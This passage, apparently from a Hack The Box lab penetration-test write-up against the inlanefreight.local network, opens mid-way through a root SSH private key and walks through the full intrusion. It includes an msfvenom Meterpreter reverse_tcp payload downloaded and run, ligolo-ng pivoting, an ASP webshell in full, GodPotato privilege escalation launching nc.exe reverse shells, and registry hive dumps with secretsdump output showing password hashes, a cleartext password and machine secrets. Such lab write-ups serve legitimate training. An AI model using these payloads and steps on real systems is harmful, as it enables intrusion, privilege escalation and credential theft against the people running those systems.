hnx8PbhWb5ItpMxLhUNv9mos/I8oqqcFTpZCNjZKZAxIs/RchduAQRpxuGChkNAJPy6nLe
xmCIKZS5euMwXmXhGOXi0r1ZKyYCxj8tSGn8VWZY0Enlj+PIfznMGQXH6ppGxa0x2BAAAA
wESN/RceY7eJ69vvJz+Jjd5ZpOk9aO/VKf+gKJGCqgjyefT9ZTyzkbvJA58b7l2I2nDyd7
N4PaYAIZUuEmdZG715CD9qRi8GLb56P7qxVTvJn0aPM8mpzAH8HR1+mHnv+wZkTD9K9an+
L2qIboIm1eT13jwmxgDzs+rrgklSswhPA+HSbKYTKtXLgvoanNQJ2//ME6kD9LFdC97y9n
IuBh4GXEiiWtmYNakti3zccbfpl4AavPeywv4nlGo1vmIL3wAAAMEA7agLGUE5PQl8PDf6
fnlUrw/oqK64A+AQ02zXI4gbZR/9zblXE7zFafMf9tX9OtC9o+O0L1Cy3SFrnTHfPLawSI
nuj+bd44Y4cB5RIANdKBxGRsf8UGvo3wdgi4JIc/QR9QfV59xRMAMtFZtAGZ0hTYE1HL/8
sIl4hRY4JjIw+plv2zLi9DDcwti5tpBN8ohDMA15VkMcOslG69uymfnX+MY8cXjRDo5HHT
M3i4FvLUv9KGiONw94OrEX7JlQA7b5AAAAwQDihl6ELHDORtNFZV0fFoFuUDlGoJW1XR/2
n8qll95Fc1MZ5D7WGnv7mkP0ureBrD5Q+OIbZOVR+diNv0j+fteqeunU9MS2WMgK/BGtKm
41qkEUxOSFNgs63tK/jaEzmM0FO87xO1yP8x4prWE1WnXVMlM97p8osRkJJfgIe7/G6kK3
9PYjklWFDNWcZNlnSiq09ZToRbpONEQsP9rPrVklzHU1Zm5A+nraa1pZDMAk2jGBzKGsa8
WNfJbbEPrmQf0AAAALcm9vdEB1YnVudHU=
-----END OPENSSH PRIVATE KEY-----
```

Using this, let's try logging-in through `ssh`.
Before that, I need to change the permission to `600`.

```bash
┌──(kali㉿kali)-[~/htb]
└─$ ssh -i root.priv root@inlanefreight.local
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-113-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 26 Dec 2024 03:38:26 AM UTC

  System load:                      0.02
  Usage of /:                       93.0% of 13.72GB
  Memory usage:                     71%
  Swap usage:                       0%
  Processes:                        469
  Users logged in:                  1
  IPv4 address for br-65c448355ed2: 172.18.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for ens160:          10.129.229.147
  IPv6 address for ens160:          dead:beef::250:56ff:feb0:c480
  IPv4 address for ens192:          172.16.8.120

  => / is using 93.0% of 13.72GB


82 updates can be applied immediately.
16 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Fri Mar  8 09:55:50 2024
root@dmz01:~# whoami
root
```

I got root!

### Internal Networks Enumeration

Setting up a meterpreter session, let's use `ping_sweep` to find useful network.

Create a payload using `msfvenom`:

```bash
┌──(kali㉿kali)-[~/htb]
└─$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.14.50 LPORT=9001 -f elf > shell.elf
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 123 bytes
Final size of elf file: 207 bytes
```


Upload and run the payload:

```bash
root@dmz01:~# wget http://10.10.14.50:8000/shell.elf
--2024-12-26 04:20:06--  http://10.10.14.50:8000/shell.elf
Connecting to 10.10.14.50:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 207 [application/octet-stream]
Saving to: ‘shell.elf’

shell.elf           100%[================>]     207  --.-KB/s    in 0s      

2024-12-26 04:20:06 (30.6 MB/s) - ‘shell.elf’ saved [207/207]

root@dmz01:~# chmod +x shell.lef
chmod: cannot access 'shell.lef': No such file or directory
root@dmz01:~# chmod +x shell.elf
root@dmz01:~# ./shell.elf
```

Spawn a meterpreter shell:

```bash
┌──(kali㉿kali)-[~/htb]
└─$ msfconsole -q 
msf6 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload linux/x86/meterpreter/reverse_tcp
payload => linux/x86/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.10.14.50
LHOST => 10.10.14.50
msf6 exploit(multi/handler) > set LPORT 9001
LPORT => 9001
msf6 exploit(multi/handler) > options

Payload options (linux/x86/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.14.50      yes       The listen address (an interface may be specified)
   LPORT  9001             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target



View the full module info with the info, or info -d command.

msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.50:9001 
[*] Sending stage (1017704 bytes) to 10.129.36.12
[*] Meterpreter session 1 opened (10.10.14.50:9001 -> 10.129.36.12:53358) at 2024-12-25 23:21:03 -0500

meterpreter > 
```

Set autoroute:

```vbnet
msf6 exploit(multi/handler) > use post/multi/manage/autoroute 
msf6 post(multi/manage/autoroute) > options

Module options (post/multi/manage/autoroute):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CMD      autoadd          yes       Specify the autoroute command (Accepted: add, autoad
                                       d, print, delete, default)
   NETMASK  255.255.255.0    no        Netmask (IPv4 as "255.255.255.0" or CIDR as "/24"
   SESSION                   yes       The session to run this module on
   SUBNET                    no        Subnet (IPv4, for example, 10.10.10.0)


View the full module info with the info, or info -d command.

msf6 post(multi/manage/autoroute) > set SESSION 1
SESSION => 1

msf6 post(multi/manage/autoroute) > run

[*] Running module against 10.129.36.12
[*] Searching for subnets to autoroute.
[+] Route added to subnet 10.129.0.0/255.255.0.0 from host's routing table.
[+] Route added to subnet 172.16.0.0/255.255.0.0 from host's routing table.
[+] Route added to subnet 172.17.0.0/255.255.0.0 from host's routing table.
[+] Route added to subnet 172.18.0.0/255.255.0.0 from host's routing table.
[*] Post module execution completed
```

Ping sweep on `172.16.8.0/23`:

```bash
msf6 post(multi/manage/autoroute) > use post/multi/gather/ping_sweep
msf6 post(multi/gather/ping_sweep) > set rhosts 172.16.8.0/23
rhosts => 172.16.8.0/23
msf6 post(multi/gather/ping_sweep) > set SESSION 1
SESSION => 1
msf6 post(multi/gather/ping_sweep) > options

Module options (post/multi/gather/ping_sweep):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS   172.16.8.0/23    yes       IP Range to perform ping sweep against.
   SESSION  1                yes       The session to run this module on


View the full module info with the info, or info -d command.

msf6 post(multi/gather/ping_sweep) > run

[*] Performing ping sweep for IP range 172.16.8.0/23
[+]     172.16.8.3 host found
[+]     172.16.8.20 host found
[+]     172.16.8.50 host found
[+]     172.16.8.120 host found
```

Let's save these IPs to `internal_hosts.txt`:

```bash
┌──(kali㉿kali)-[~/htb]
└─$ cat internal_host.txt 
172.16.8.3
172.16.8.20
172.16.8.50
```


### Pivoting

Let's try pivoting using `ligolo-ng`.

Set proxy:

```bash
┌──(kali㉿kali)-[~/htb/ligolo]
└─$ sudo ip tuntap add user kali mode tun ligolo 
[sudo] password for kali: 

┌──(kali㉿kali)-[~/htb/ligolo]
└─$ sudo ip link set ligolo up

┌──(kali㉿kali)-[~/htb/ligolo]
└─$ ./proxy -selfcert -laddr 0.0.0.0:443
WARN[0000] Using default selfcert domain 'ligolo', beware of CTI, SOC and IoC! 
WARN[0000] Using self-signed certificates               
WARN[0000] TLS Certificate fingerprint for ligolo is: 3D98ACF7CFD6E1B4BAD816FDF677D16A234EE20B593CE80C97CF39B64120F563 
INFO[0000] Listening on 0.0.0.0:443                     
    __    _             __                       
   / /   (_)___ _____  / /___        ____  ____ _
  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/
 / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ /
/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /
        /____/                          /____/                          
  Made in France ♥            by @Nicocha30!                                     
  Version: 0.7.2-alpha                                                     
ligolo-ng » INFO[0007] Agent joined.                                 name=root@dmz01 remote="10.129.36.12:54948"
ligolo-ng » 
ligolo-ng » session
? Specify a session : 1 - root@dmz01 - 10.129.36.12:54948 - 78ca86d1-5722-4cc5-92f0-e992b5b963ac

[Agent : root@dmz01] » session
? Specify a session : 1 - root@dmz01 - 10.129.36.12:54948 - 78ca86d1-5722-4cc5-92f0-e992b5b963ac

[Agent : root@dmz01] » start
[Agent : root@dmz01] » INFO[0075] Starting tunnel to root@dmz01         
```

Set Client:

```bash
root@dmz01:~# wget http://10.10.14.50:8000/agent
--2024-12-26 03:58:29--  http://10.10.14.50:8000/agent
Connecting to 10.10.14.50:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 6029312 (5.8M) [application/octet-stream]
Saving to: ‘agent’

agent                   100%[============================>]   5.75M   848KB/s    in 8.6s    

2024-12-26 03:58:38 (689 KB/s) - ‘agent’ saved [6029312/6029312]

root@dmz01:~# chmod +x agent
root@dmz01:~# ./agent -connect 10.10.14.50:443 -ignore-cert
WARN[0000] warning, certificate validation disabled     
INFO[0000] Connection established                        addr="10.10.14.50:443"


┌──(kali㉿kali)-[~/htb]
└─$ sudo ip route add 172.16.0.0/16 dev ligolo     
[sudo] password for kali: 
```

Then the pivoting is established.
Now I can freely communicate with internal IPs.

---

# Internal Penetration Testing

### Port scanning

Let's scan identified internal hosts with `nmap`.

```bash
root@dmz01:/tmp# ./nmap --open -iL internal_host.txt

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2024-12-27 15:54 UTC
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for 172.16.8.3
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (0.00044s latency).
Not shown: 1173 closed ports
PORT    STATE SERVICE
53/tcp  open  domain
88/tcp  open  kerberos
135/tcp open  epmap
139/tcp open  netbios-ssn
389/tcp open  ldap
445/tcp open  microsoft-ds
464/tcp open  kpasswd
593/tcp open  unknown
636/tcp open  ldaps
MAC Address: 00:50:56:B0:30:D0 (Unknown)

Nmap scan report for 172.16.8.20
Host is up (0.00045s latency).
Not shown: 1175 closed ports
PORT     STATE SERVICE
80/tcp   open  http
111/tcp  open  sunrpc
135/tcp  open  epmap
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
2049/tcp open  nfs
3389/tcp open  ms-wbt-server
MAC Address: 00:50:56:B0:6C:16 (Unknown)

Nmap scan report for 172.16.8.50
Host is up (0.00049s latency).
Not shown: 1177 closed ports
PORT     STATE SERVICE
135/tcp  open  epmap
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
8080/tcp open  http-alt
MAC Address: 00:50:56:B0:AC:44 (Unknown)

Nmap done: 3 IP addresses (3 hosts up) scanned in 142.79 seconds
```

- 172.16.8.3(DC01)
	- Given Kerberos port 88, it looks like a Domain Controller.
	- dns(53) is running.
	- rpc(135) is running.
	- smb(139, 445) is running.
	- ldap(389, 636) is running.
- 172.16.8.20(DEV01)
	- Web service(http) is running on port 80.
	- rpc(135) is running.
	- smb(139, 445) is running.
	- nfs(2049) port is open.
	- Remote Desktop service(3389) is open.
- 172.16.8.50(MS01)
	- rpc(135) is running.
	- smb(139, 445) is running.
	- Remote Desktop service(3389) is open.
	- http(8080) is running.

### Enumeration

##### 172.16.8.3

Let's scan thoroughly first.

```bash
┌──(kali㉿kali)-[~/htb]
└─$ nmap -p53,135,139,445,389,636,5895 -sCV 172.16.8.3
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-27 11:39 EST
Nmap scan report for 172.16.8.3
Host is up (0.53s latency).

PORT     STATE  SERVICE       VERSION
53/tcp   open   domain?
135/tcp  open   msrpc         Microsoft Windows RPC
139/tcp  open   netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open   ldap          Microsoft Windows Active Directory LDAP (Domain: INLANEFREIGHT.LOCAL0., Site: Default-First-Site-Name)
445/tcp  open   microsoft-ds?
636/tcp  open   tcpwrapped
5895/tcp closed unknown
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 59m59s
|_nbstat: NetBIOS name: DC01, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b0:30:d0 (VMware)
| smb2-time: 
|   date: 2024-12-27T17:42:42
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 186.12 seconds
```

- Domain name is `inlanefreight.local`.
- `winrm`(5985) is additionally found.

Let's enumerate DNS this time.

```yaml
┌──(kali㉿kali)-[~/htb]
└─$ dig axfr inlanefreight.local @172.16.8.3    

; <<>> DiG 9.20.0-Debian <<>> axfr inlanefreight.local @172.16.8.3
;; global options: +cmd
; Transfer failed.
                                                                             
┌──(kali㉿kali)-[~/htb]
└─$ dig any inlanefreight.local @172.16.8.3

; <<>> DiG 9.20.0-Debian <<>> any inlanefreight.local @172.16.8.3
;; global options: +cmd
;; Got answer:
;; WARNING: .local is reserved for Multicast DNS
;; You are currently testing what happens when an mDNS query is leaked to DNS
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 3238
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 4, AUTHORITY: 0, ADDITIONAL: 3

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
; COOKIE: a348606d510425f2 (echoed)
;; QUESTION SECTION:
;inlanefreight.local.           IN      ANY

;; ANSWER SECTION:
inlanefreight.local.    600     IN      A       172.16.9.3
inlanefreight.local.    600     IN      A       172.16.8.3
inlanefreight.local.    3600    IN      NS      dc01.inlanefreight.local.
inlanefreight.local.    3600    IN      SOA     dc01.inlanefreight.local. hostmaster.inlanefreight.local. 66 900 600 86400 3600

;; ADDITIONAL SECTION:
dc01.inlanefreight.local. 3600  IN      A       172.16.8.3
dc01.inlanefreight.local. 3600  IN      A       172.16.9.3

;; Query time: 216 msec
;; SERVER: 172.16.8.3#53(172.16.8.3) (TCP)
;; WHEN: Fri Dec 27 11:46:04 EST 2024
;; MSG SIZE  rcvd: 190
```

Can't find much.

What about RPC service?

```bash
┌──(kali㉿kali)-[~/htb]
└─$ rpcclient -U '' 172.16.8.3                           
Password for [WORKGROUP\]:
Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
```

Can't do anything without credential yet.

```bash
┌──(kali㉿kali)-[~/htb]
└─$ smbclient -L 172.16.8.3
Password for [WORKGROUP\kali]:
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 172.16.8.3 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

Same here. Without credential, there's nothing to do.

##### 172.16.8.20

```bash
┌──(kali㉿kali)-[~/htb]
└─$ nmap -p53,80,111,135,139,445,389,636,2049,5895,8080 -sCV 172.16.8.20
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-27 11:56 EST
Nmap scan report for 172.16.8.20
Host is up (0.57s latency).

PORT     STATE  SERVICE       VERSION
53/tcp   closed domain
80/tcp   open   http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
| http-robots.txt: 16 disallowed entries (15 shown)
| /*/ctl/ /admin/ /App_Browsers/ /App_Code/ /App_Data/ 
| /App_GlobalResources/ /bin/ /Components/ /Config/ /contest/ /controls/ 
|_/Documentation/ /HttpModules/ /Install/ /Providers/
|_http-title: Home
111/tcp  open   rpcbind       2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp  open   msrpc         Microsoft Windows RPC
139/tcp  open   netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  closed ldap
445/tcp  open   microsoft-ds?
636/tcp  closed ldapssl
2049/tcp open   nlockmgr      1-4 (RPC #100021)
5895/tcp closed unknown
8080/tcp closed http-proxy
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: ACADEMY-AEN-DEV, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b0:6c:16 (VMware)
| smb2-time: 
|   date: 2024-12-27T17:57:59
|_  start_date: N/A
|_clock-skew: 59m58s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 235.22 seconds
```

Let's visit http(80) service.

![](attachments/aen_41.png)

It's a website named DNN(DotNetNuke). This looks like a page introducing a software DNN.
Let's google it to see if there's any information or vulnerability.

![](attachments/aen_42.png)

There are some interesting RCE exploits.. Maybe useful for the later use.

Also it has login function with register.
I tried to register new user, but it says the site administrator needs to approve.

Let's visit NFS(2049) then.

```bash
┌──(kali㉿kali)-[~/htb]
└─$ showmount -e 172.16.8.20
Export list for 172.16.8.20:
/DEV01 (everyone)
```

There is a share named `/DEV01`!
I can mount it on the pivoting machine.
Let's mount the share and see what's in it.

```
root@dmz01:/tmp# mkdir DEV01

root@dmz01:/tmp# mount -t nfs 172.16.8.20:/DEV01 /tmp/DEV01

root@dmz01:/tmp# cd DEV01/

root@dmz01:/tmp/DEV01# ls
BuildPackages.bat            CKToolbarSets.xml  WatchersNET.CKEditor.sln
CKEditorDefaultSettings.xml  DNN
CKToolbarButtons.xml         flag.txt
```

There's a directory named `DNN` of which name is the same as the website I found before.

```bash
root@dmz01:/tmp/DEV01# cd DNN
root@dmz01:/tmp/DEV01/DNN# ls
App_LocalResources                Objects
Browser                           Options.aspx
bundleconfig.json                 Options.aspx.cs
CKEditorOptions.ascx              Options.aspx.designer.cs
CKEditorOptions.ascx.cs           packages.config
CKEditorOptions.ascx.designer.cs  Properties
CKEditorOptions.ascx.resx         UrlControl.ascx
CKFinder                          Utilities
CKHtmlEditorProvider.cs           WatchersNET.CKEditor.csproj
Constants                         Web
Content                           web.config
Controls                          web.Debug.config
Extensions                        web.Deploy.config
Install                           web.Release.config
Module
root@dmz01:/tmp/DEV01/DNN# cat web.config
<?xml version="1.0"?>
<configuration>
  <!--
    For a description of web.config changes see http://go.microsoft.com/fwlink/?LinkId=235367.

    The following attributes can be set on the <httpRuntime> tag.
      <system.Web>
        <httpRuntime targetFramework="4.6.2" />
      </system.Web>
  -->
  <username>Administrator</username>
  <password>
        <value>D0tn31Nuk3R0ck$$@123</value>
  </password>
  <system.web>
    <compilation debug="true" targetFramework="4.5.2"/>
    <httpRuntime targetFramework="4.5.2"/>
  </system.web>
```

Bingo! I found `web.config` file on the directory, and it contains `Administrator`'s password : `D0tn31Nuk3R0ck$$@123`

This credential will be useful when I'm exploiting http service.

##### 172.16.8.50

```bash
┌──(kali㉿kali)-[~/htb]
└─$ nmap -p53,80,111,135,139,445,389,636,2049,5895,8080 -sCV 172.16.8.50
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-27 12:10 EST
Nmap scan report for 172.16.8.50
Host is up (0.58s latency).

PORT     STATE  SERVICE       VERSION
53/tcp   closed domain
80/tcp   closed http
111/tcp  closed rpcbind
135/tcp  open   msrpc         Microsoft Windows RPC
139/tcp  open   netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  closed ldap
445/tcp  open   microsoft-ds?
636/tcp  closed ldapssl
2049/tcp closed nfs
5895/tcp closed unknown
8080/tcp open   http          Apache Tomcat 10.0.21
|_http-title: Apache Tomcat/10.0.21
|_http-favicon: Apache Tomcat
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 59m58s
| smb2-time: 
|   date: 2024-12-27T18:10:44
|_  start_date: N/A
|_nbstat: NetBIOS name: ACADEMY-AEN-MS0, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b0:ac:44 (VMware)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 41.16 seconds
```

It has `Apache Tomcat` service running on port 8080.
Let's take a look into it.

![](attachments/aen_43.png)

```bash
┌──(kali㉿kali)-[~/htb]
└─$ gobuster dir -u http://172.16.8.50:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.16.8.50:8080
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/docs                 (Status: 302) [Size: 0] [--> /docs/]
/manager              (Status: 302) [Size: 0] [--> /manager/]
```

I tried several easy credentials on `/manager` page, but none of them worked..

### Webshell on DNN

I used the found credential `Administrator` : `D0tn31Nuk3R0ck$$@123`, and I successfully logged in.

I tried the vulnerability I found before, but it didn't work..

Instead, I found another attack methodology:
https://book.hacktricks.xyz/ko/network-services-pentesting/pentesting-web/dotnetnuke-dnn

![](attachments/aen_44.png)

First, let's activate `xp_cmdshell`.

![](attachments/aen_45.png)

Then I checked if it worked with `xp_cmdshell 'whoami'`, and it successfully returned the command output.

![](attachments/aen_46.png)

Then, I added extensions for the later use : `asp,aspx,exe,ps1,SAVE,zip`
And I moved to `/admin/file-management` page.

Let's upload a `ASP` webshell:

```ASP
<%
Set oScript = Server.CreateObject("WSCRIPT.SHELL")
Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")
Function getCommandOutput(theCommand)
    Dim objShell, objCmdExec
    Set objShell = CreateObject("WScript.Shell")
    Set objCmdExec = objshell.exec(thecommand)
    getCommandOutput = objCmdExec.StdOut.ReadAll
end Function
%>


<HTML>
<BODY>
<FORM action="" method="GET">
<input type="text" name="cmd" size=45 value="<%= szCMD %>">
<input type="submit" value="Run">
</FORM>
<PRE>
<%= "\\" & oScriptNet.ComputerName & "\" & oScriptNet.UserName %>
<%Response.Write(Request.ServerVariables("server_name"))%>
<p>
<b>The server's port:</b>
<%Response.Write(Request.ServerVariables("server_port"))%>
</p>
<p>
<b>The server's software:</b>
<%Response.Write(Request.ServerVariables("server_software"))%>
</p>
<p>
<b>The server's software:</b>
<%Response.Write(Request.ServerVariables("LOCAL_ADDR"))%>
<% szCMD = request("cmd")
thisDir = getCommandOutput("cmd /c" & szCMD)
Response.Write(thisDir)%>
</p>
<br>
</BODY>
</HTML>
```

![](attachments/aen_47.png)

Then, I can open the uploaded webshell.

![](attachments/aen_48.png)

### Privilege Escalation to `SYSTEM` on DMZ

I checked the owned user's privilege, and it has `SeImpersonatePrivilege`:

```bash
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

Let me upload `PrintSpoofer64.exe` here.

```bash
c:\DotNetNuke\Portals\0\PrintSpoofer64.exe -c "c:\DotNetNuke\Portals\0\nc.exe 10.10.14.50 9000 -e cmd"
```

But it didn't work. So I tried `GodPotato` instead, and it worked!

```bash
c:\DotNetNuke\Portals\0\GodPotato-NET4.exe -cmd "cmd /c whoami"

172.16.8.20[*] CombaseModule: 0x140734192746496
[*] DispatchTable: 0x140734195064048
[*] UseProtseqFunction: 0x140734194439328
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] CreateNamedPipe \\.\pipe\aca7508b-2fd4-4b60-8c6c-96dae52cacee\pipe\epmapper
[*] Trigger RPCSS
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 0000d802-0d94-ffff-d7a0-7e6d641f0c31
[*] DCOM obj OXID: 0xed92114352c73d10
[*] DCOM obj OID: 0xabdb2527e492b787
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 916 Token:0x788  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 1392
nt authority\system
```

Let's open a reverse shell. I'll use `nc.exe` binary.

```bash
c:\DotNetNuke\Portals\0\GodPotato-NET4.exe -cmd "c:\DotNetNuke\Portals\0\nc.exe 172.16.8.120 443 -e cmd"
```

Then, the listener immediately captured the reverse shell.

```bash
root@dmz01:/tmp# nc -nlvp 443
Listening on 0.0.0.0 443
Connection received on 172.16.8.20 52725
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>whoami
whoami
nt authority\system
```

Now I have a root of the system `172.16.8.20`!

### Credential dump

Since this host belongs to AD network, it might be useful to obtain hashes.
Let's dump the hash.

```makefile
c:\DotNetNuke\Portals\0>reg save HKLM\SYSTEM SYSTEM.SAVE
reg save HKLM\SYSTEM SYSTEM.SAVE
The operation completed successfully.

c:\DotNetNuke\Portals\0>reg save HKLM\SECURITY SECURITY.SAVE
reg save HKLM\SECURITY SECURITY.SAVE
The operation completed successfully.

c:\DotNetNuke\Portals\0>reg save HKLM\SAM SAM.SAVE
reg save HKLM\SAM SAM.SAVE
The operation completed successfully.
```

Through DNN web, I can download those files. Let's use `impacket-secretsdump`.

```bash
┌──(kali㉿kali)-[~/htb/secretsdump]
└─$ impacket-secretsdump LOCAL -system SYSTEM.SAVE -sam SAM.SAVE -security SECURITY.SAVE
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Target system bootKey: 0xb3a720652a6fca7e31c1659e3d619944
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e20798f695ab0d04bc138b22344cea8:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
mpalledorous:1001:aad3b435b51404eeaad3b435b51404ee:3bb874a52ce7b0d64ee2a82bbf3fe1cc:::
[*] Dumping cached domain logon information (domain/username:hash)
INLANEFREIGHT.LOCAL/hporter:$DCC2$10240#hporter#f7d7bba128ca183106b8a3b3de5924bc: (2022-06-23 04:59:45)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
$MACHINE.ACC:plain_password_hex:82a0b8d4bc2a8663830503c0cbaa524708946319d6cb4a7dd24765648f59fa11090d2b969ac9a4c22298dae21917b39589f1dc7f593db42cbf952e2acb7808cc2b0ffbdc0bf8b66ccdb43f8cc6c9e2b649683bb5febbde22810742cc3f5722c387e919cb881fb7ff60a39fee2a742e45a24f0ded2a1d03a24fdf6052a37efe486f001ad806dd4b8aa519313cad01f03d6bc399f183a73a809bd7b546795d1ca08e2853348c9524d4a25a2c93a5a4e5205437f8598e582216326afea97f4b344c7289dd815cc990e75e0e917676ffb09737b95e6da4a4399e0ced4e6f6ae6dc613bee188ddac81ce8ca2708b13d7d3ab7
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:6d653f124855d6c8171a2e98770862e2
[*] DefaultPassword 
(Unknown User):Gr8hambino!
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x6968d50f5ec2bc41bc207a35f0392b72bb083c22
dpapi_userkey:0xe1e7a8bc8273395552ae8e23529ad8740d82ea92
[*] NL$KM 
 0000   21 0C E6 AC 8B 08 9B 39  97 EA D9 C6 77 DB 10 E6   !......9....w...
 0010   2E B2 53 43 7E B8 06 64  B3 EB 89 B1 DA D1 22 C7   ..SC~..d......".
 0020   11 83 FA 35 DB 57 3E B0  9D 84 59 41 90 18 7A 8D   ...5.W>...YA..z.
